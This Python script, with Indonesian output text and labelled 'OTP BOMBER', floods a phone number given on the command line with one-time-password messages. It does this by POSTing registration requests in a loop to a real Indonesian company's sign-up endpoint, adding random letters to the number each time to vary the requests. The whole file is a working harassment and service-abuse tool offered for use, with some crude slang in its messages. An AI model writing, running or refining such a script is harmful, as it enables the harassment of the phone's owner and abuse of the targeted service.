import requests
import sys,json
import random
#x = requests.get('https://w3schools.com/python/demopage.htm')


abc = ['a','e', 'b', 'c', 'd', 'u', 'k', 't', 'r', 'P', 'l']
#nama = input("nama : ")
print ("")
print ("#######################")
print ("#       OTP BOMBER    #")
print ("#######################")



try :
    a = len(sys.argv[1])
    if(a>0):
        if(sys.argv[1].isnumeric()):
            print ("\nya ini nomor\n")
            #####
            try:
                jml_bom = input("jumlah bom : ")
                hitung = 0
                while (hitung < int(jml_bom)):
                    hitung = hitung+1
                    acak = random.randint(0, 999)
                    panjang_acak = len(str(acak))
                    asu=0
                    rangkaian_h = ''
                    while (asu < panjang_acak):
                        fetch_number = int(str(acak)[asu])
                        rangkaian_h = rangkaian_h + abc[fetch_number]
                        asu =asu+1
                    headers = {'X-Requested-With': 'XMLHttpRequest'}   
                    req = requests.post("https://digital.pegadaian.co.id/register/step-1", data={'nama':'sutuik', 'no_hp':str(sys.argv[1])+rangkaian_h, 'email':'aa@afs.fu'}, headers = headers)
                    if(req.json()['status'] == 'success'):
                        sys.stdout.write("\rbom yang berhasil dikirim : "+str(hitung))
                print ("")
            except(ValueError):
                print ("format mu lo Cok")
        else:
            print ("\nMasukkan format yang benar!\n")
except(IndexError):
    print ("Example : ")
    print ("send.py <nomor telepon>")
    print ("send.py 0855003399448\n")

#print("nama mu adalah : "+str(sys.argv[1]))